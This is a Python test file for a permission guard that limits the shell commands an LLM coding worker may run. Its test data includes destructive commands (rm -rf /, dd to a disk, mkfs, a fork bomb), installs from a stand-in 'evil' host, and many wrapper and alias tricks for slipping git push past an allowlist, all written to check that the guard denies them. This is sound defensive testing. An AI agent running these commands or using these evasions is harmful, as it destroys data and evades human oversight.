from __future__ import annotations

from pathlib import Path

import pytest

from skep.workers.llm_plan import LlmPlanError, LlmToolPlan, PlannedToolStep
from skep.workers.runtime_plugins import (
    RESUME_CHECKPOINT_PLUGIN,
    SHELL_EXEC_PLUGIN,
    ResumeCursor,
    WorkerPluginSelectionError,
    build_worker_runtime_spec,
    runtime_plugin_manifest,
)


def _decide(argv: list[str], purpose: str = "run") -> object:
    # Pass argv into both grant sets to prove the guard fires before them.
    return SHELL_EXEC_PLUGIN.decision(
        purpose=purpose,
        argv=argv,
        command=" ".join(argv),
        approved_shell_commands=[tuple(argv)],
        shell_allowlist=[tuple(argv)],
    )


@pytest.mark.parametrize(
    "argv",
    [
        ["git", "checkout", "main"],
        ["git", "switch", "main"],
        ["git", "checkout", "-b", "feature"],
        ["git", "-C", "/abs/worktree", "checkout", "main"],
        ["git", "-C", "/abs/worktree", "switch", "-c", "feature"],
    ],
)
def test_shell_exec_denies_branch_switch(argv: list[str]) -> None:
    """v19-F5: branch/HEAD switching is denied even when granted/allowlisted."""
    decision = _decide(argv)
    assert decision.verdict == "deny"  # type: ignore[attr-defined]
    assert decision.reason == "capability.deny.git_branch_ops_managed_by_supervisor"  # type: ignore[attr-defined]
    assert "managed by the skep supervisor" in decision.detail  # type: ignore[attr-defined]


def test_shell_exec_allows_git_checkout_file_restore() -> None:
    """``git checkout -- <path>`` restores files and stays legal."""
    decision = _decide(["git", "checkout", "--", "existing.py"])
    assert decision.verdict == "allow_with_constraints"  # type: ignore[attr-defined]


@pytest.mark.parametrize(
    "argv",
    [
        ["git", "push"],
        ["git", "push", "origin", "add-readme:main"],
        ["git", "-C", "/abs/worktree", "push"],
        ["git", "pull"],
        ["git", "fetch", "origin"],
    ],
)
def test_shell_exec_denies_remote_git(argv: list[str]) -> None:
    """v19-F3: remote git ops are denied even when granted/allowlisted."""
    decision = _decide(argv)
    assert decision.verdict == "deny"  # type: ignore[attr-defined]
    assert decision.reason == "capability.deny.remote_git_managed_by_supervisor"  # type: ignore[attr-defined]
    assert "managed by the skep supervisor" in decision.detail  # type: ignore[attr-defined]


def test_shell_exec_remote_git_deny_beats_approved_grant() -> None:
    """A resume grant for `git push` must not override the F3 deny."""
    decision = SHELL_EXEC_PLUGIN.decision(
        purpose="run",
        argv=["git", "push", "origin", "main"],
        command="git push origin main",
        approved_shell_commands=[("git", "push", "origin", "main")],
        shell_allowlist=[("git", "push", "origin", "main")],
    )
    assert decision.verdict == "deny"
    assert decision.reason == "capability.deny.remote_git_managed_by_supervisor"


@pytest.mark.parametrize(
    "argv",
    [
        ["git", "commit", "-m", "smuggled"],
        ["git", "add", "-A"],
        ["git", "add", "."],
        ["git", "-C", "/abs/worktree", "commit", "-m", "smuggled"],
    ],
)
def test_shell_exec_denies_worker_commit(argv: list[str]) -> None:
    """v22-F2: plan-level git add/commit is denied outright — the landing
    approval is the commit — even when granted/allowlisted or labeled verify."""
    for purpose in ("run", "verify"):
        decision = _decide(argv, purpose=purpose)
        assert decision.verdict == "deny"  # type: ignore[attr-defined]
        assert decision.reason == "capability.deny.git_commit_managed_by_supervisor"  # type: ignore[attr-defined]
        assert "landing approval is the commit" in decision.detail  # type: ignore[attr-defined]


@pytest.mark.parametrize(
    "argv",
    [
        ["rm", "-rf", "/"],
        ["rm", "--no-preserve-root", "-r", "/anything"],
        ["mkfs.ext4", "/dev/sda1"],
        ["diskutil", "eraseDisk", "APFS", "Blank", "disk2"],
        ["dd", "if=/dev/zero", "of=/dev/sda"],
        ["shutdown", "-h", "now"],
        ["init", "0"],
        ["chmod", "-R", "777", "/etc"],
    ],
)
def test_shell_exec_denies_catastrophic_commands(argv: list[str]) -> None:
    """v109-F10: machine-wreckers are denied outright — before the verify
    fast-path and every grant (the `_decide` helper passes argv into BOTH
    grant sets), with the joke+teach detail."""
    for purpose in ("run", "verify"):
        decision = _decide(argv, purpose=purpose)
        assert decision.verdict == "deny"  # type: ignore[attr-defined]
        assert decision.reason == "capability.deny.catastrophic_command"  # type: ignore[attr-defined]
        assert decision.detail  # type: ignore[attr-defined]


def test_shell_exec_denies_string_level_catastrophes() -> None:
    """v109-F10: shapes an argv cannot represent (fork bomb, device redirect)
    are caught on the command string, still before the verify fast-path."""
    for command in ("bash -c ':(){ :|:& };:'", "sh -c 'cat image.img > /dev/sda'"):
        decision = SHELL_EXEC_PLUGIN.decision(
            purpose="verify",
            argv=command.split(),
            command=command,
            approved_shell_commands=[],
            shell_allowlist=[],
        )
        assert decision.verdict == "deny"
        assert decision.reason == "capability.deny.catastrophic_command"


def test_shell_exec_keeps_workspace_rm_legal() -> None:
    """The near-miss stays normal life: `rm -rf ./build` rides its allowlist."""
    decision = _decide(["rm", "-rf", "./build"])
    assert decision.verdict == "allow_with_constraints"  # type: ignore[attr-defined]


def test_shell_exec_git_mutation_labeled_verify_does_not_fast_path() -> None:
    """v20-F1: a git mutation mislabeled purpose="verify" must not bypass approval
    (mutations not on the v22-F2 deny list still fall through to approval)."""
    argv = ["git", "tag", "v1"]
    decision = SHELL_EXEC_PLUGIN.decision(
        purpose="verify",
        argv=argv,
        command=" ".join(argv),
        approved_shell_commands=[],
        shell_allowlist=[],
    )
    assert decision.verdict == "require_approval"
    assert decision.reason != "capability.allow.shell_verify"


@pytest.mark.parametrize(
    "argv",
    [
        ["pytest", "-q"],
        ["python", "-m", "pytest"],
        ["git", "status"],
        ["git", "diff", "--cached"],
        ["git", "log", "--oneline"],
        ["git", "-C", "/abs/worktree", "show", "HEAD"],
    ],
)
def test_shell_exec_verify_fast_path_is_the_pinned_argv_only(argv: list[str]) -> None:
    """ES-F3 (B06): the fast-path allows exactly the project's pinned
    verify_command. The same argv, merely LABELLED verify by the worker, takes
    the allowlist/approval path like any other command."""
    pinned = SHELL_EXEC_PLUGIN.decision(
        purpose="verify",
        argv=argv,
        command=" ".join(argv),
        approved_shell_commands=[],
        shell_allowlist=[],
        pinned_verify=[tuple(argv)],
    )
    assert pinned.verdict == "allow"
    assert pinned.reason == "capability.allow.shell_verify"
    labelled = SHELL_EXEC_PLUGIN.decision(
        purpose="verify",
        argv=argv,
        command=" ".join(argv),
        approved_shell_commands=[],
        shell_allowlist=[],
    )
    assert labelled.verdict == "require_approval"


def test_a_verify_label_buys_nothing_for_an_unpinned_command() -> None:
    """ES-F3 (B06, mac-p1 P1-c): `purpose: verify` on an arbitrary sqlite3
    write forged an approval row. Unpinned → approval; allowlisted → the
    allowlist's own constrained verdict, never the verify fast-path."""
    argv = ["sqlite3", "supervisor.sqlite3", "INSERT INTO approvals VALUES (1)"]
    forged = SHELL_EXEC_PLUGIN.decision(
        purpose="verify",
        argv=argv,
        command=" ".join(argv),
        approved_shell_commands=[],
        shell_allowlist=[],
        pinned_verify=[("uv", "run", "pytest")],
    )
    assert forged.verdict == "require_approval"
    allowlisted = SHELL_EXEC_PLUGIN.decision(
        purpose="verify",
        argv=["uv", "run", "pytest", "-q"],
        command="uv run pytest -q",
        approved_shell_commands=[],
        shell_allowlist=[("uv", "run", "pytest")],
        pinned_verify=[("uv", "run", "pytest")],
    )
    assert allowlisted.verdict == "allow_with_constraints"
    assert allowlisted.reason == "capability.allow.shell_allowlist_prefix"


def _decide_with_grants(
    argv: list[str],
    *,
    approved: list[tuple[str, ...]] | None = None,
    allowlist: list[tuple[str, ...]] | None = None,
) -> object:
    return SHELL_EXEC_PLUGIN.decision(
        purpose="run",
        argv=argv,
        command=" ".join(argv),
        approved_shell_commands=approved or [],
        shell_allowlist=allowlist or [],
    )


def test_shell_exec_approved_command_covers_bare_flag_variant() -> None:
    """v93-F1: same command, same operands, only bare flags changed — the
    resume grant covers the retry instead of re-carding the operator."""
    decision = _decide_with_grants(
        ["pytest", "-vv", "tests/test_api.py"],
        approved=[("pytest", "-x", "tests/test_api.py")],
    )
    assert decision.verdict == "allow_with_constraints"  # type: ignore[attr-defined]
    assert (
        decision.reason  # type: ignore[attr-defined]
        == "capability.allow.resume_approved.shell_command_flag_variant"
    )
    # I8: the record names the approval that covered the variant.
    assert "pytest -x tests/test_api.py" in decision.detail  # type: ignore[attr-defined]


def test_shell_exec_allowlist_covers_bare_flag_variant() -> None:
    """v93-F1: the session tier rides the merged allowlist (v86-F1), so the
    same coverage holds for later runs of the serve session."""
    decision = _decide_with_grants(
        ["uv", "run", "pytest", "-q", "tests/test_api.py"],
        allowlist=[("uv", "run", "pytest", "-x", "tests/test_api.py")],
    )
    assert decision.verdict == "allow_with_constraints"  # type: ignore[attr-defined]
    assert (
        decision.reason  # type: ignore[attr-defined]
        == "capability.allow.shell_allowlist_flag_variant"
    )


@pytest.mark.parametrize(
    ("argv", "approved"),
    [
        # A changed operand is a different command, not a flag variant.
        (["pytest", "-x", "tests/test_other.py"], ("pytest", "-x", "tests/test_api.py")),
        # A glued value never reads as a bare flag — no payload rides a "flag".
        (
            ["uv", "pip", "install", "--index-url=http://evil", "requests"],
            ("uv", "pip", "install", "requests"),
        ),
        # A separated flag value parses as a positional and blocks the match.
        (["pytest", "-k", "slow", "tests/"], ("pytest", "tests/")),
        # Post-`--` tokens are operands by convention, whatever they look like.
        (["ls", "--", "-trap"], ("ls", "--", "safe.txt")),
        # Flags-are-the-payload binaries never match the variant lane.
        (["git", "clean", "-fdx"], ("git", "clean", "-n")),
        (["find", ".", "-delete"], ("find", ".", "-type")),
        # (sudo is denied outright since ES-F262: test_shell_prefixes.)
    ],
)
def test_shell_exec_flag_variant_lane_stays_closed(
    argv: list[str], approved: tuple[str, ...]
) -> None:
    """v93-F1: everything that is not a pure bare-flag change still cards."""
    decision = _decide_with_grants(argv, approved=[approved], allowlist=[approved])
    assert decision.verdict == "require_approval"  # type: ignore[attr-defined]


_PLAN = LlmToolPlan(
    summary="touch a marker.",
    required_tools=("shell.run",),
    steps=(PlannedToolStep(tool="shell.run", args={"argv": ["touch", "marker.txt"]}),),
    expected_stdout=None,
)


def test_resume_checkpoint_v2_round_trips_cursor() -> None:
    cursor = ResumeCursor(
        completed_steps=1,
        changed_files=("a.py",),
        commands=({"command": "touch marker.txt", "exit_code": 0, "purpose": "run"},),
        verification={"command": "pytest -q", "exit_code": 0, "output": "ok"},
    )
    state = RESUME_CHECKPOINT_PLUGIN.state_for_plan(
        _PLAN, workspace=Path("/tmp/worktree"), cursor=cursor
    )

    checkpoint = RESUME_CHECKPOINT_PLUGIN.checkpoint_from_state(state)

    assert checkpoint is not None
    assert checkpoint.workspace == "/tmp/worktree"
    assert checkpoint.cursor == cursor
    assert checkpoint.plan.summary == _PLAN.summary


def test_resume_checkpoint_v1_parses_without_cursor() -> None:
    state = RESUME_CHECKPOINT_PLUGIN.state_for_plan(_PLAN)
    state["resume_checkpoint"] = {"version": 1, "plan": state["resume_checkpoint"]["plan"]}

    checkpoint = RESUME_CHECKPOINT_PLUGIN.checkpoint_from_state(state)

    assert checkpoint is not None
    assert checkpoint.cursor is None
    assert checkpoint.workspace is None
    assert checkpoint.plan.summary == _PLAN.summary


def test_resume_checkpoint_rejects_unknown_version() -> None:
    state = RESUME_CHECKPOINT_PLUGIN.state_for_plan(_PLAN)
    state["resume_checkpoint"]["version"] = 4

    with pytest.raises(LlmPlanError):
        RESUME_CHECKPOINT_PLUGIN.checkpoint_from_state(state)


def test_version_three_state_belongs_to_the_react_reader() -> None:
    """v69-F3: a react checkpoint is not an error to the plan reader — it
    returns None there and parses through react_checkpoint_from_state; a
    version-3 state with an unknown protocol is refused by BOTH."""
    state = RESUME_CHECKPOINT_PLUGIN.state_for_plan(_PLAN)
    state["resume_checkpoint"]["version"] = 3
    state["resume_checkpoint"]["protocol"] = "react"
    state["resume_checkpoint"]["conversation"] = [{"role": "user", "content": "hi"}]

    assert RESUME_CHECKPOINT_PLUGIN.checkpoint_from_state(state) is None
    react = RESUME_CHECKPOINT_PLUGIN.react_checkpoint_from_state(state)
    assert react is not None and react.conversation[0]["content"] == "hi"

    state["resume_checkpoint"]["protocol"] = "mystery"
    with pytest.raises(LlmPlanError):
        RESUME_CHECKPOINT_PLUGIN.react_checkpoint_from_state(state)


def test_runtime_plugin_registry_builds_queen_worker_spec() -> None:
    spec = build_worker_runtime_spec(
        worker_kind="coding",
        worker_version="coding-minimal-0.1.0",
        plugin_ids=(
            "resume_checkpoint",
            "instruction_guard",
            "shell_exec",
            "verification",
        ),
    )

    assert spec.to_payload() == {
        "worker_kind": "coding",
        "worker_version": "coding-minimal-0.1.0",
        "plugin_ids": [
            "resume_checkpoint",
            "instruction_guard",
            "shell_exec",
            "verification",
        ],
        "runtime_plugins": runtime_plugin_manifest(
            (
                "resume_checkpoint",
                "instruction_guard",
                "shell_exec",
                "verification",
            )
        ),
    }


def test_runtime_plugin_registry_rejects_unknown_plugin() -> None:
    with pytest.raises(WorkerPluginSelectionError, match="unknown runtime plugin"):
        build_worker_runtime_spec(
            worker_kind="coding",
            worker_version="coding-minimal-0.1.0",
            plugin_ids=("missing",),
        )


# ES-F1 (B124, I4): the floor judges what RUNS, not how it is spelled. Every
# argv below pushed (or could push) past an allowlist on es-integration-2.
@pytest.mark.parametrize(
    "argv",
    [
        ["/usr/bin/git", "push"],
        ["git", "-c", "protocol.version=2", "push", "origin", "HEAD:refs/heads/x"],
        ["git", "--git-dir=.git", "push"],
        ["git", "--git-dir", ".git", "--work-tree", ".", "push"],
        ["git", "--no-pager", "-P", "fetch"],
        ["git", "send-pack", "../origin.git", "main"],
        ["git", "remote", "set-url", "origin", "https://evil"],
        ["nice", "-n", "5", "git", "push"],
        ["timeout", "20", "git", "push"],
        ["timeout", "-s", "KILL", "20", "git", "push"],
        ["command", "git", "push"],
        ["exec", "git", "push"],
        ["nohup", "git", "push"],
        ["stdbuf", "-oL", "git", "push"],
        ["xargs", "-I{}", "git", "push"],
        ["sudo", "-u", "root", "git", "push"],
        ["/usr/bin/env", "-S", "git push"],
        ["sh", "-c", "timeout 5 /usr/bin/git -c a=b push"],
    ],
)
def test_es_f1_git_floor_sees_through_spellings_and_wrappers(argv: list[str]) -> None:
    decision = SHELL_EXEC_PLUGIN.decision(
        purpose="run",
        argv=argv,
        command=" ".join(argv),
        approved_shell_commands=[],
        # The live repro's allowlist: bare `git` and `timeout`.
        shell_allowlist=[("git",), ("timeout",), (argv[0],)],
    )
    assert decision.verdict == "deny", argv


@pytest.mark.parametrize(
    "argv",
    [
        ["git", "-c", "alias.p=push", "p"],
        ["git", "p", "origin"],
        ["xargs", "git"],
        ["git", "update-ref", "refs/heads/main", "HEAD~1"],
        ["git", "branch", "-f", "main", "HEAD"],
        ["git", "symbolic-ref", "HEAD", "refs/heads/other"],
        ["git", "worktree", "add", "../x"],
    ],
)
def test_es_f1_unknown_git_subcommands_and_ref_moves_are_denied(argv: list[str]) -> None:
    decision = _decide_with_grants(argv, allowlist=[("git",)])
    assert decision.verdict == "deny", argv  # type: ignore[attr-defined]


def test_es_f1_an_exactly_allowlisted_alias_runs() -> None:
    decision = _decide_with_grants(["git", "lg"], allowlist=[("git", "lg")])
    assert decision.verdict == "allow_with_constraints"  # type: ignore[attr-defined]


@pytest.mark.parametrize(
    "argv",
    [
        ["/usr/bin/git", "status"],
        ["git", "-c", "color.ui=never", "diff"],
        ["timeout", "60", "pytest", "-q"],
        ["git", "branch", "--show-current"],
        ["git", "remote", "-v"],
    ],
)
def test_es_f1_normal_commands_still_reach_the_allowlist(argv: list[str]) -> None:
    decision = _decide_with_grants(argv, allowlist=[tuple(argv)])
    assert decision.verdict == "allow_with_constraints", argv  # type: ignore[attr-defined]


def test_es_f1_command_v_git_is_a_lookup_not_a_launch() -> None:
    decision = _decide_with_grants(["command", "-v", "git"])
    assert decision.verdict == "require_approval"  # type: ignore[attr-defined]


@pytest.mark.parametrize(
    "argv",
    [
        ["GIT", "push"],
        ["/usr/bin/Git", "fetch"],
        ["TIMEOUT", "5", "git", "push"],
        ["BASH", "-c", "git push"],
        ["/bin/bash", "-c", "git push"],
        ["sh", "-c", "A=1 git push"],
        ["RM", "-rf", "/"],
    ],
)
def test_a_worker_floor_reads_the_program_however_it_is_cased(argv: list[str]) -> None:
    decision = _decide(argv)
    assert decision.verdict == "deny", argv  # type: ignore[attr-defined]


@pytest.mark.parametrize(
    "argv",
    [
        ["find", ".", "-exec", "git", "push", ";"],
        ["git", "submodule", "foreach", "git push"],
        ["git", "bisect", "run", "git", "push"],
        ["busybox", "sh", "-c", "git push"],
        ["parallel", "git push", ":::", "a"],
        ["watch", "git push"],
        ["script", "-q", "/dev/null", "git", "push"],
        ["git", "clone", "https://example.com/r.git"],
        ["git", "ls-remote", "origin"],
        ["git", "submodule", "update", "--init"],
    ],
)
def test_a_worker_cannot_exec_a_push_through_another_program(argv: list[str]) -> None:
    decision = _decide(argv)
    assert decision.verdict == "deny", argv  # type: ignore[attr-defined]
